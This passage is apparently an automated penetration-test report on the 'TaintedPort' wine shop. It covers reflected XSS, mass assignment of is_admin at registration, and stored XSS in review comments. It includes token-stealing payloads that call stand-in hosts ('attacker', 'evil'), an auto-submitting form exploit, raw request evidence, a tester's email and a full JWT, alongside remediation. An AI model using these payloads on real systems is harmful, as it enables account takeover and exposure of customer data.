           │             │                                      │
           │             │  Response 200:                       │
           │             │    Content-Type: text/html           │
           │             │    (no CSP, no XCTO, no XFO)         │
           │             │    <div class="message-value">       │
           │             │      <script>…</script>              │
           │             │    </div>  ← RAW REFLECTION          │
           │             └────────────────┬─────────────────────┘
           │                              │
           │  [4] Browser navigates to    │
           │      the HTML response       │
           │  ◄───────────────────────────┘
           │
           │  [5] <script> executes on taintedport.com origin:
           │        token = localStorage.getItem('token')
           │        fetch('https://attacker/?t=' + token)
           │
           │  [6] JWT exfiltrated ─────────────────────────────►
           │                                              ┌──────────────┐
           │                                              │   Attacker   │
           │                                              │  logs JWT    │
           │                                              └──────┬───────┘
           │                                                     │
           │                        [7] Attacker uses JWT:       │
           │                              GET /auth/me           │
           │                              Authorization: Bearer …│
           │                                                     ▼
           │                                 ┌────────────────────────────┐
           │                                 │  api.taintedport.com       │
           │                                 │  → HTTP 200 with victim's  │
           │                                 │    profile.                │
           │                                 │  → Full ATO for the 7-day  │
           │                                 │    JWT lifetime.           │
           │                                 └────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ROOT CAUSE                                                              │
│                                                                         │
│   Missing output encoding on user-controlled input rendered into a      │
│   text/html response, compounded by:                                    │
│     (a) No CSP on the taintedport.com origin.                           │
│     (b) JWT stored in localStorage on the same origin as the sink.      │
│     (c) No CSRF protection on the reflecting endpoint, and a CORS-      │
│         simple content type that lets cross-origin forms deliver the    │
│         payload without a preflight.                                    │
└─────────────────────────────────────────────────────────────────────────┘
```


#### Impact

Full account takeover of any logged-in TaintedPort user who is lured to an attacker-controlled URL. Exploitation is trivial (an ordinary HTML page with an auto-submitting form) and requires no prior privilege on the attacker's side and no interaction beyond the victim visiting the malicious page.

Concrete demonstrated impact (against the tester account `luis.grangeia@snyk.io`, user_id=373):
- The victim's JWT is exfiltrated verbatim from `localStorage.token` by JavaScript that the attacker injected into the reflected HTML response.
- The stolen JWT authenticates unmodified against `https://api.taintedport.com/auth/me` and returns the victim's profile — proof that the token is the sole authentication credential and that no additional binding (IP, device fingerprint) protects it.
- The token is HS256-signed with a 7-day expiry and there is no server-side revocation surface — a stolen token remains valid until natural expiry.

Downstream capabilities available with a stolen JWT (same across the userbase):
- Read and modify account settings via `/auth/*` (email, password, profile).
- Read cart and order history; order records disclose `owner_password_hash` and `owner_totp_secret` for the account owner — so a single stolen token yields a persistent takeover primitive that survives token expiry (password + TOTP).
- Any admin capability if the victim happens to be an admin.

The population at risk is every user of TaintedPort. No preconditions beyond "victim visits attacker page while logged in". No CSP, HSTS, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy are set, so no partial mitigation is in place.

#### Technical Analysis

Root cause: the server-side handler for `POST /api/contact/preview` (PHP/8.2.31) concatenates the raw request-body values for `name`, `email`, `subject`, and `message` into an HTML template and emits the result with `Content-Type: text/html; charset=UTF-8`. No HTML entity encoding is applied to any of the four fields.

Observed reflection sinks (verified with distinct per-field markers):

- `name` → `<div class="value">…</div>`
- `email` → `<div class="value">…</div>` (Cloudflare's email-obfuscation script rewrites values that match an @-address pattern, but arbitrary HTML tags reflect verbatim)
- `subject` → `<div class="value">…</div>`
- `message` → `<div class="message-value">…</div>`

Preconditions for the cross-site exploit chain, all satisfied on the live target:

1. Reflection endpoint served on the same origin (`taintedport.com`) as the SPA that stores the JWT in `localStorage.token`.
2. Reflection endpoint is unauthenticated, so any visitor's browser can be coerced into calling it.
3. Reflection endpoint has no CSRF token and no `Sec-Fetch-Site: same-origin` enforcement.
4. Reflection endpoint accepts `application/x-www-form-urlencoded` — a CORS-simple content type. A cross-origin `<form method=POST>` therefore submits without a preflight, and the browser follows the response.
5. Response is `Content-Type: text/html`, so the browser parses and executes any injected `<script>` / event-handler payload.
6. No `Content-Security-Policy` on the response — inline `<script>` is unrestricted.
7. JWT is stored in `localStorage`, i.e. reachable by any script running on `taintedport.com`; the token is HS256-signed with a 7-day expiry and no server-side revocation.

The chain trivially compounds each condition: an attacker page (anywhere on the internet) auto-submits a form to `https://taintedport.com/api/contact/preview` with a `message` value of `<script>fetch('https://attacker/?t='+localStorage.token)</script>`. The victim's browser navigates to the reflected HTML response on the `taintedport.com` origin; the inline `<script>` executes with same-origin authority, reads the JWT out of `localStorage`, and exfiltrates it. The attacker can then use the stolen JWT against `https://api.taintedport.com` to read the account (profile, cart, order history — which discloses `owner_password_hash` and `owner_totp_secret` — plus admin capabilities if the victim is an admin) and to perform any state-changing operation.


#### Proof of Concept


Reproduction (verified end-to-end in a headed Chromium browser via playwright):

1. Log the victim in via the normal API flow to obtain a JWT:
   POST https://api.taintedport.com/auth/login  (Content-Type: application/json)
   Body: {"email":"luis.grangeia@snyk.io","password":"<redacted>"}
   Response: HTTP 200 with a JWT.

2. Store this JWT in `localStorage.token` on `https://taintedport.com` — this is what the SPA does automatically after login.

3. Load the following attacker page from any non-target origin (in the validation run: an about:blank origin, i.e. opaque and distinct from the target). Any hosted URL works equivalently:
   <html><body>
   <form id=f action="https://taintedport.com/api/contact/preview" method="POST">
     <input name=name    value="A">
     <input name=email   value="a@b.co">
     <input name=subject value="S">
     <input name=message value='<script>window.stolenToken=localStorage.getItem("token");document.title="XSS-EXFIL:"+window.stolenToken;</script>'>
   </form>
   <script>document.getElementById('f').submit();</script>
   </body></html>

4. Observed behaviour:
   - Browser POSTs application/x-www-form-urlencoded cross-origin (no preflight).
   - Response is HTTP 200, Content-Type: text/html; charset=UTF-8, containing <div class="message-value"><script>...</script></div>.
   - Browser navigates to https://taintedport.com/api/contact/preview and executes the inline <script> on that origin.
   - document.title becomes XSS-EXFIL:eyJhbGciOi...Y4Avo — byte-identical to the victim's JWT read from localStorage. In a real attack the payload would be fetch('https://attacker/?t='+localStorage.token); the document.title channel is used only so the exploit is self-contained.

5. Confirm account takeover using the exfiltrated token:
   GET https://api.taintedport.com/auth/me
   Authorization: Bearer <stolen JWT>
   Response: HTTP 200 with the victim's profile — the attacker now controls the victim's account.

Reference scripts:
- verify.py — regression check using only requests; asserts that all four fields reflect verbatim in a text/html response.
- poc.py — full end-to-end demonstration using playwright; logs the victim in, seeds localStorage.token, loads a cross-origin attacker page, watches the JWT get exfiltrated, and uses it against /auth/me to prove account takeover.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Reflection is unescaped inside a text/html response (unauthenticated)**

*Request:*
```http
POST /api/contact/preview HTTP/1.1
Host: taintedport.com
Content-Type: application/x-www-form-urlencoded

name=VALIDATOR&email=v%40v.co&subject=SUB&message=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/8.2.31

<div class="value">VALIDATOR</div>
<div class="value">SUB</div>
<div class="message-value"><script>alert(1)</script></div>
```


> The endpoint reflects every submitted field verbatim into an HTML page. No CSP, no X-Content-Type-Options, no HSTS, no X-Frame-Options in the response headers. No authentication or CSRF token required.



**2. Victim login (normal SPA flow that puts a JWT in localStorage on taintedport.com)**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"luis.grangeia@snyk.io","password":"<REDACTED>"}
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozNzMsImVtYWlsIjoibHVpcy5ncmFuZ2VpYUBzbnlrLmlvIiwiaXNfYWRtaW4iOmZhbHNlLCJpYXQiOjE3ODQ1NDc2OTMsImV4cCI6MTc4NTE1MjQ5M30.iqn1yK7APuubRndaDkXexsc6mncZqBdUFRb2w5Y4Avo","user":{"id":373,"name":"Luis Grangeia","email":"luis.grangeia@snyk.io","is_admin":false}}
```


> This is the standard SPA login. The returned JWT is stored client-side in localStorage.token on the taintedport.com origin — the exact same origin as the reflection sink.



**3. Cross-site delivery: attacker page (opaque origin) auto-submits a form to the reflection endpoint**

*Request:*
```http
POST /api/contact/preview HTTP/1.1
Host: taintedport.com
Origin: null
Content-Type: application/x-www-form-urlencoded

name=A&email=a%40b.co&subject=S&message=%3Cscript%3Ewindow.stolenToken%3DlocalStorage.getItem%28%22token%22%29%3Bdocument.title%3D%22XSS-EXFIL%3A%22%2Bwindow.stolenToken%3B%3C%2Fscript%3E
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<div class="message-value"><script>window.stolenToken=localStorage.getItem("token");document.title="XSS-EXFIL:"+window.stolenToken;</script></div>
```


> Because the endpoint accepts application/x-www-form-urlencoded, the request is a CORS-simple request — no preflight, no Origin allowlist check on the server. The browser then navigates to the response and, since Content-Type is text/html, parses and executes the inline <script> on the taintedport.com origin. Post-submit document.title = 'XSS-EXFIL:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozNzMsImVtYWlsIjoibHVpcy5ncmFuZ2VpYUBzbnlrLmlvIiwiaXNfYWRtaW4iOmZhbHNlLCJpYXQiOjE3ODQ1NDc2OTMsImV4cCI6MTc4NTE1MjQ5M30.iqn1yK7APuubRndaDkXexsc6mncZqBdUFRb2w5Y4Avo' — byte-exact victim JWT read from localStorage by injected JS.



**4. Stolen JWT yields full account takeover**

*Request:*
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozNzMsImVtYWlsIjoibHVpcy5ncmFuZ2VpYUBzbnlrLmlvIiwiaXNfYWRtaW4iOmZhbHNlLCJpYXQiOjE3ODQ1NDc2OTMsImV4cCI6MTc4NTE1MjQ5M30.iqn1yK7APuubRndaDkXexsc6mncZqBdUFRb2w5Y4Avo
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"user":{"id":373,"name":"Luis Grangeia","email":"luis.grangeia@snyk.io","is_admin":false,"totp_enabled":false,"created_at":"2026-07-20 11:02:17"}}
```


> The token exfiltrated by the injected JavaScript authenticates against the API — the attacker fully controls the victim's session (7-day JWT lifetime, no server-side revocation).





#### Remediation

1. HTML-encode every user-controlled field before inserting it into the preview response. In PHP, apply `htmlspecialchars($v, ENT_QUOTES | ENT_HTML5, 'UTF-8')` to each of `name`, `email`, `subject`, and `message` (and to any future field added to this template). Do not concatenate raw request data into HTML templates — use a templating library that escapes by default.

2. Deploy a strict `Content-Security-Policy` on all responses from `taintedport.com` and `api.taintedport.com`: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`. Use per-response nonces or hashes for any legitimately inline scripts. A CSP without `'unsafe-inline'` would have neutralised the inline `<script>` payload independently of the encoding bug.

3. Set the following security headers on both hostnames:
   - `X-Content-Type-Options: nosniff`
   - `X-Frame-Options: DENY`
   - `Referrer-Policy: no-referrer`
   - `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`

4. Stop storing authentication tokens in `localStorage`. Move to an `HttpOnly; Secure; SameSite=Strict` session cookie, or, if a header-bearer flow must be retained, use a short-lived in-memory access token combined with a refresh cookie. This defence-in-depth prevents JavaScript exfiltration even if a future XSS is introduced.

5. Add CSRF protection to `/api/contact/preview` (double-submit cookie or synchronizer token) or reject requests whose `Sec-Fetch-Site` is not `same-origin`. This blocks cross-site delivery even if some other reflected-XSS bug is missed.

6. Add server-side JWT revocation (a token blacklist or per-user token version) so that a compromised token can be invalidated before the 7-day natural expiry, and shorten the token lifetime materially (e.g. 15-minute access token + refresh token).

7. Consider removing `POST /api/contact/preview` entirely. The "Confirm" button on the returned page is a client-side `alert()` with no downstream send handler, so this whole preview page appears to be a superficial UI step that does not need a server round-trip and provides no business value that could not be delivered client-side with automatic escaping.

---


### vuln-0007: Mass Assignment on POST /auth/register — `is_admin` field grants full administrator privileges to any unauthenticated attacker










**Severity:** CRITICAL | **CVSS:** 9.1 | **Endpoint:** `/auth/register` | **Method:** POST | **CWE:** CWE-915 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

#### Description

The registration endpoint `POST /auth/register` on the TaintedPort API binds every field of the client-supplied JSON body into the newly created user record. When an unauthenticated attacker adds `"is_admin": true` alongside the ordinary `name`, `email` and `password` fields, the server accepts it, persists the flag on the new user's row, and immediately issues an auto-login JWT whose signed payload carries `is_admin=true`. That token is trusted by every `/admin/*` endpoint, allowing the attacker to enumerate all customer orders (with PII), read full shipping details for any order, and mutate order state — in a single unauthenticated HTTP request, with no email verification and no rate limit.

The vulnerability is field-name specific: only the exact string `is_admin` triggers self-promotion. Common variants (`isAdmin`, `role`, `admin`, `user_type`) are silently ignored. The behaviour is consistent with a registration handler that forwards every JSON key into the User INSERT and relies on column existence as the only filter — a classic missing allow-list gap. `is_admin` happens to be a real writable column on the `users` table.


#### Attack Flow

```
┌────────────────────────────────────────────────────────────────────────────┐
│  Mass Assignment on POST /auth/register → self-promoted administrator      │
└────────────────────────────────────────────────────────────────────────────┘

  Prerequisite: none (registration is open, unauthenticated, no email verify)

   ┌──────────────┐                                    ┌──────────────────────┐
   │  Attacker    │                                    │  TaintedPort API     │
   │ (no account) │                                    │ (PHP 8.2 backend)    │
   └──────┬───────┘                                    └──────────┬───────────┘
          │                                                       │
    ─── PHASE 1: mass-assign is_admin during signup ──────────────
          │  POST /auth/register                                   │
          │  { "name":"MA",                                        │
          │    "email":"attacker@ex.com",                          │
          │    "password":"…",                                     │
          │    "is_admin": true   ◄── extra key, no allow-list     │
          │  }                                                     │
          │──────────────────────────────────────────────────────► │
          │                                                        │
          │                                    ┌───────────────────▼──────────┐
          │                                    │  Registration handler:       │
          │                                    │  binds every JSON key into   │
          │                                    │  INSERT INTO users SET …     │
          │                                    │  `is_admin` is a real column │
          │                                    │  → attacker's value stored   │
          │                                    └───────────────────┬──────────┘
          │                                                        │
          │  HTTP 201  { user.is_admin=true, token: eyJ… }         │
          │◄────────────────────────────────────────────────────── │
          │                                                        │
    ─── PHASE 2: JWT carries signed is_admin=true ────────────────
          │  base64url-decode token payload:                       │
          │  { "user_id":N, "is_admin":true, "iat":…, "exp":… }    │
          │                                                        │
    ─── PHASE 3: use the token against /admin/* ──────────────────
          │  GET /admin/orders                                     │
          │  Authorization: Bearer <admin JWT>                     │
          │──────────────────────────────────────────────────────► │
          │                                    ┌───────────────────▼──────────┐
          │                                    │  Admin middleware checks     │
          │                                    │  jwt.is_admin === true → ✔   │
          │                                    └───────────────────┬──────────┘
          │  HTTP 200  { orders: [139 records] }                   │
          │  ─ user_id, user_name, user_email                      │
          │  ─ shipping_name / city / total per order              │
          │◄────────────────────────────────────────────────────── │
          │                                                        │
          │  GET /admin/orders/{id}                                │
          │──────────────────────────────────────────────────────► │
          │  HTTP 200  { shipping_street, postal_code, phone,      │
          │              delivery_notes, items[…] }                │
          │◄────────────────────────────────────────────────────── │
          │                                                        │
          │  PUT /admin/orders/{id}/status  { status:"…" }         │
          │──────────────────────────────────────────────────────► │
          │  HTTP 200 — order state mutated                        │
          │◄────────────────────────────────────────────────────── │
          ▼

  Root cause:
    • Registration handler forwards every JSON key into the User INSERT.
    • The only implicit "filter" is column existence on the users table.
    • is_admin is a real writable column, so the attacker's value is stored.
    • The admin middleware trusts the is_admin claim in the JWT (which was
      read from the row the attacker controlled).

  Fix in one line:
    Explicitly permit ONLY {name,email,password} from the request body.
```


#### Impact

A remote unauthenticated attacker can promote themselves to administrator in one HTTP request. Once admin they can:

- Enumerate every order in the store via `GET /admin/orders`, exposing for each order: `user_id`, `user_name`, `user_email`, `shipping_name`, `shipping_city`, order date and total. During validation this returned 139 orders and included real customer email addresses.
- View any order's full detail via `GET /admin/orders/{id}` — shipping street, postal code, phone number, delivery notes and line items with prices — direct PII for every customer.
- Modify order state via `PUT /admin/orders/{id}/status` — mark orders `processing`, `shipped`, `delivered`, `cancelled`. For a cash-on-delivery wine shop this disrupts real-world fulfilment and can be used to defraud or harass customers.
- Chain with other endpoints reachable only from an administrator role, including endpoints that expose bcrypt password hashes and TOTP secrets, making bulk offline cracking and 2FA hijack trivial.

Business impact: mass PII exposure (regulated under GDPR for the target's EU customer base), order tampering, and a foundation for account takeover of any user in the system. Prerequisite is zero: the attacker needs no account, no token, and no prior knowledge — only the ability to send an HTTPS request.

#### Technical Analysis

Root cause: the registration handler does not maintain a field allow-list when mapping the JSON request body into the User INSERT. Observed behaviour is consistent with `INSERT INTO users SET ...$body` (or the framework equivalent) where every posted key is bound if a column with the same name exists on the `users` table. Because `is_admin` is a real column and the handler forwards unknown keys unfiltered, the attacker's flag is persisted verbatim.

Evidence pipeline (each step verified independently during validation):

1. `POST /auth/register` with `is_admin:true` returns 201 with `user.is_admin=true` in the response body.
2. The JWT issued immediately by the server contains `"is_admin":true` in its signed payload — meaning the token-signing routine read the value from the row that was just inserted, so the flag is truly persisted in the database, not merely echoed.
3. A subsequent `GET /auth/me` (which re-reads the row from the DB) still shows `is_admin=true`, ruling out any response-only echo of the client input.
4. `GET /admin/orders` returns HTTP 200 with the full admin payload for this token, whereas the same call with a normal-user JWT (verified as a control in the same run) returns HTTP 403 `Admin access required.`. This proves the backend BFLA check is driven off `is_admin`, and that the mass-assigned flag flows all the way through to it.
5. `PUT /admin/orders/{id}/status` was probed with a non-existent order id (999999) to avoid tampering with real data. The normal-user token returned 403 `Admin access required.`; the mass-assigned admin token returned 404 `Order not found.` — the admin-check is bypassed for writes as well as reads.

Field-name specificity: only the exact key `is_admin` triggers the vulnerability. Variants `isAdmin`, `role`, `admin`, `user_type`, `is_admin_user` are silently discarded, suggesting the handler is a loose bind-all whose only filter is column existence on the target table. This gives an attacker a compact list of dangerous keys to try against every other write endpoint (`id`, `user_id`, `password_hash`, `totp_secret`, `totp_enabled`, `is_admin`).

CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes) is the direct match. Effect also implicates CWE-269 (Improper Privilege Management).


#### Proof of Concept


Reproduction requires no credentials.

1. Send `POST /auth/register` with `Content-Type: application/json` and body:
   `{"name":"MA","email":"attacker+<ts>@example.com","password":"Attacker!Pass123","is_admin":true}`
   Server responds `201 Created` with `{"success":true,"token":"eyJ...","user":{"id":N,"is_admin":true}}`.

2. Base64url-decode the middle segment of the JWT. Confirm the payload contains `"is_admin":true`.

3. Optional sanity check — `GET /auth/me` with `Authorization: Bearer <token>` returns `user.is_admin=true` (server re-read from DB confirms persistence).

4. `GET /admin/orders` with the same `Authorization` header returns HTTP 200 and the full list of orders (customer emails, names, cities, totals). Baseline control: repeat the same call with a JWT from a normal registration and observe HTTP 403 "Admin access required."

5. Write-access proof without tampering: `PUT /admin/orders/999999/status {"status":"processing"}` with the mass-assigned admin token returns HTTP 404 "Order not found." while the same request with a normal token returns HTTP 403 "Admin access required." — the admin check is bypassed for writes.

Full reproduction and evidence are in `poc.py`; automated pass/fail check is in `verify.py`.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Baseline — normal registration produces a non-admin user**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"Normal User","email":"val-normal-1784547808520@example.com","password":"NormalP@ss123"}
```

*Response:*
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"token":"eyJ...(non-admin)","user":{"id":441,"name":"Normal User","email":"val-normal-1784547808520@example.com","is_admin":false}}
```


> Registering without is_admin correctly creates a non-admin user.



**2. Baseline — the non-admin token is denied by /admin/orders**

*Request:*
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <normal-user JWT>
```

*Response:*
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"success":false,"message":"Admin access required."}
```


> Confirms the server enforces an is_admin-based BFLA check on /admin/*.



**3. Exploit — inject is_admin:true into the registration body**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"MA Admin PoC","email":"val-admin-1784547808520@example.com","password":"AdminP@ss123","is_admin":true}
```

*Response:*
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiJ9...","user":{"id":442,"name":"MA Admin PoC","email":"val-admin-1784547808520@example.com","is_admin":true}}
```


> Server accepts the extra is_admin field and persists it. The response object confirms the user was stored with is_admin=true.



**4. Decoded JWT payload — signed admin claim**

*Request:*
```http
(no request — client-side base64url decode of the JWT payload segment)
```

*Response:*
```http
{"user_id":442,"email":"val-admin-1784547808520@example.com","is_admin":true,"iat":1784547808,"exp":1785152608}
```


> The JWT signed by the backend carries is_admin=true, meaning the token-issuing routine read the value from the freshly persisted DB row.



**5. /auth/me re-reads the row and confirms persistence**

*Request:*
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <mass-assigned admin JWT>
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"user":{"id":442,"name":"MA Admin PoC","email":"val-admin-1784547808520@example.com","is_admin":true,"totp_enabled":false,"created_at":"2026-07-20 11:43:28"}}
```


> Server-side re-read still shows is_admin=true — the flag is persisted, not merely echoed.



**6. Confidentiality — /admin/orders is now accessible (customer PII leak)**

*Request:*
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <mass-assigned admin JWT>
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"orders":[{"id":139,"user_id":373,"user_name":"Luis Grangeia","user_email":"luis.grangeia@snyk.io","total":...,"status":"pending","shipping_name":"...","shipping_city":"...","order_date":"2026-07-20 11:43:13","items_count":1}, ... 139 total records ...]}
```


> All orders in the system are enumerated, exposing user_id, name, email, shipping name/city and totals for every customer.



**7. Confidentiality — /admin/orders/{id} exposes full shipping details**

*Request:*
```http
GET /admin/orders/137 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <mass-assigned admin JWT>
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"order":{"id":137,"user_id":...,"total":...,"status":"pending","shipping_name":...,"shipping_street":...,"shipping_city":...,"shipping_postal_code":...,"shipping_phone":...,"delivery_notes":...,"user_name":...,"user_email":...,"items":[...]}}
```


> Order detail exposes full street address, postal code and phone number of the customer — direct PII.



**8. Integrity — write access to /admin/orders/{id}/status (safe probe: non-existent order id)**

*Request:*
```http
PUT /admin/orders/999999/status HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <mass-assigned admin JWT>
Content-Type: application/json

{"status":"processing"}
```

*Response:*
```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{"success":false,"message":"Order not found."}
```


> With the mass-assigned admin token the request passes authorisation and reaches business validation (404). The same request with a normal-user token returns 403 'Admin access required.' — proving admin-check is bypassed for writes as well, without tampering with any real order.





#### Remediation

1. Bind explicit fields only in the registration handler. Extract `name`, `email` and `password` from the request body by name and ignore everything else. In PHP:
```php
$body = json_decode(file_get_contents('php://input'), true) ?? [];
$allowed = ['name','email','password'];
$body = array_intersect_key($body, array_flip($allowed));
$stmt = $pdo->prepare("INSERT INTO users (name, email, password_hash) VALUES (:n,:e,:h)");
$stmt->execute([':n'=>$body['name'], ':e'=>$body['email'], ':h'=>password_hash($body['password'], PASSWORD_BCRYPT)]);
```

2. Maintain a server-side deny-list constant for every write endpoint, covering at minimum: `id`, `user_id`, `is_admin`, `password_hash`, `totp_secret`, `totp_enabled`, `created_at`, `email_verified`. Reject or strip these before any INSERT/UPDATE regardless of the endpoint.

3. Add a regression test that posts `{name,email,password,is_admin:true,isAdmin:true,role:"admin"}` to `/auth/register` and asserts the resulting `users` row has `is_admin=false` and the issued JWT contains `is_admin=false`.

4. Audit every other write endpoint (`PUT /auth/profile`, order creation, address updates, etc.) for the same pattern. Grep for direct assignment of `$_POST`, `$body`, `req.body`, `params.permit!` or ORM `update(**body)` to surface further offenders.

5. Defence in depth on admin checks. Even if a JWT arrives with `is_admin=true`, the `/admin/*` middleware should re-read the row from the database and re-verify `is_admin` there before granting access. This raises the bar from "one HTTP request" to "one HTTP request plus persistent DB tampering".

6. Invalidate the already-issued admin tokens and admin rows created by exploitation. Query the `users` table for `is_admin=true` rows and reconcile them against the intended admin allow-list; revoke sessions/JWTs for any unexpected admins.

---


### vuln-0015: Stored XSS in wine review comment field enables cross-user JWT theft and account takeover










**Severity:** HIGH | **CVSS:** 8.7 | **Endpoint:** `/wines/{id}/reviews` | **Method:** POST | **CWE:** CWE-79 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`

#### Description

The wine catalog application at https://taintedport.com allows any authenticated user to submit a review for a wine via POST /wines/{id}/reviews. The `comment` field of the submitted review is stored server-side without any sanitisation or encoding. The single-page application (SPA) served on https://taintedport.com/wines/{id} subsequently renders that `comment` value into the page as raw HTML — HTML tags and inline event handlers are inserted into the DOM as live nodes and executed by the browser.

Because self-registration is open (no email verification, no CAPTCHA, and no observed rate limit), any anonymous internet user can obtain the credential required to post reviews within seconds. Because the SPA stores its authentication JWT in `localStorage.token` on the same origin (`taintedport.com`) and no Content-Security-Policy is set, the injected JavaScript can read the visiting user's JWT and exfiltrate it to an attacker-controlled endpoint using `fetch()`.

The result is a persistent, stored cross-site scripting vulnerability with cross-user impact: a single API request from a throwaway account poisons a public wine detail page, and every subsequent authenticated visitor to that page — including administrators — has their JWT stolen. The JWT is HS256-signed with a 7-day expiry and is the sole authentication credential (no cookies, no server-side revocation), so a stolen token yields full account takeover for its remaining lifetime.

Scope note: the tester also claimed a secondary raw-HTML sink on the `user_name` field of a review. Independent testing did not reproduce that claim — the SPA renders author names via React text interpolation and HTML-encodes them (`<b id=x>foo</b>` is rendered as visible text, not a live element). This report is therefore scoped to the `comment` field sink only, which was reproduced end-to-end.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│                 STORED XSS → JWT THEFT — Attack Flow                     │
└──────────────────────────────────────────────────────────────────────────┘

  PREREQUISITES
  ─────────────
   • Open self-registration (no email verification, no rate limit)
   • JWT stored in localStorage.token (readable by same-origin JS)
   • No Content-Security-Policy on taintedport.com
   • review.comment rendered as raw HTML in the SPA (dangerouslySetInnerHTML sink)

  ┌────────────┐                                              ┌──────────────────────┐
  │  Attacker  │                                              │ api.taintedport.com  │
  │ (anon)     │                                              │  (PHP backend)       │
  └─────┬──────┘                                              └──────────┬───────────┘
        │  ① POST /auth/register {email, password}                       │
        │───────────────────────────────────────────────────────────────>│
        │  ← 201 {token: <attacker JWT>}                                 │
        │<───────────────────────────────────────────────────────────────│
        │                                                                │
        │  ② POST /wines/17/reviews                                      │
        │     Authorization: Bearer <attacker JWT>                       │
        │     {"comment":"<img src=x onerror=                            │
        │        fetch('https://evil/?t='+localStorage.token)>"}         │
        │───────────────────────────────────────────────────────────────>│
        │                                                                │  ┌──────────┐
        │                                                                │─>│ DB store │  (verbatim,
        │                                                                │  │ reviews  │   no sanitiser)
        │  ← 201 {review_id: 130}                                        │  └──────────┘
        │<───────────────────────────────────────────────────────────────│
        │
        │  (attacker walks away — page is now poisoned for every visitor)
        │
        │                                                                │
        │        VICTIM VISITS SITE (routine catalog navigation)         │
        │                                                                │
  ┌─────┴─────────────┐                                     ┌────────────┴──────────┐
  │ Victim browser    │                                     │ taintedport.com (SPA) │
  │ localStorage.token│                                     │ + api.taintedport.com │
  │  = <victim JWT>   │                                     │                       │
  └─────┬─────────────┘                                     └────────────┬──────────┘
        │                                                                │
        │  ③ GET /wines/17  (Next.js SPA loads wine detail page)         │
        │───────────────────────────────────────────────────────────────>│
        │  ← HTML + JS bundle (NO CSP header)                            │
        │<───────────────────────────────────────────────────────────────│
        │                                                                │
        │  ④ SPA calls GET /wines/17/reviews                             │
        │───────────────────────────────────────────────────────────────>│
        │  ← 200 {reviews:[{comment:"<img src=x onerror=...>"}]}         │
        │<───────────────────────────────────────────────────────────────│
        │                                                                │
        │  ⑤ SPA inserts review.comment into DOM via dangerouslySetInnerHTML
        │     <div class="text-zinc-300"><img src=x onerror=...></div>
        │
        │  ⑥ Browser fails to load src=x → dispatches error event
        │     onerror handler runs on taintedport.com origin:
        │        fetch('https://evil/?t=' + localStorage.getItem('token'))
        │                                                                                  ┌─────────────┐
        │  ⑦ Victim JWT exfiltrated ─────────────────────────────────────────────────────>│  Attacker   │
        │     (HS256, 7-day expiry, no server-side revocation)                             │  callback   │
        │                                                                                  │  endpoint   │
        │                                                                                  └──────┬──────┘
        │                                                                                         │
        │  ⑧ Attacker replays the stolen JWT to api.taintedport.com                               │
        │     as the victim → full account takeover for JWT lifetime.                             │
        │     If victim is admin: unlocks /admin/orders* (all customer PII).                      │
        │                                                                                         │
        ▼                                                                                         ▼

  ROOT CAUSE
  ──────────
   User-controlled string (review.comment) flows into an HTML sink
   (dangerouslySetInnerHTML) on the SPA without contextual output encoding.

   Two independent gaps enable weaponisation:
     • Server: POST /wines/{id}/reviews performs no sanitisation of `comment`.
     • Client: SPA renders `comment` as raw HTML instead of via {text-expression}.

  Defence-in-depth gaps that make it high-impact:
     • JWT in localStorage (not HttpOnly cookie) → readable by injected JS.
     • No Content-Security-Policy → any inline handler and any fetch() target work.
     • No JWT revocation → stolen token valid for up to 7 days.
     • Open registration → attacker cost is effectively zero.

  MITIGATION
  ──────────
   Render as {review.comment} in the SPA (React auto-escapes).
   Add server-side sanitiser; deploy strict CSP; move JWT to HttpOnly cookie.
```


#### Impact

Persistent, cross-user, cross-privilege compromise of the entire application:

- Any authenticated attacker (open registration; no verification required) can plant a stored payload on any wine detail page in ~2 API calls. From that moment onward, every visitor who opens that wine page runs attacker-controlled JavaScript on the taintedport.com origin.

